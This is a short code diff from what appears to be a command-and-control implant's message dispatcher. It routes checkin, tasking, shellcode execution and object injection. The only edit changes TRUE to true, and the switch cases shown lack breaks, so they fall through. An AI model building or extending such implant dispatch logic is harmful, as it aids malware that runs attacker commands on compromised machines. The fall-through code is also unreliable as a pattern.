@@ -248,7 +248,7 @@ namespace Dispatcher {
         auto msg_type = Parser::UnpackDword(&parser);
         switch (msg_type) {
 
-            case TypeCheckin:   Ctx->session.checkin = TRUE;
+            case TypeCheckin:   Ctx->session.checkin = true;
             case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
             case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
             case TypeObject:    Injection::LoadObject(parser);
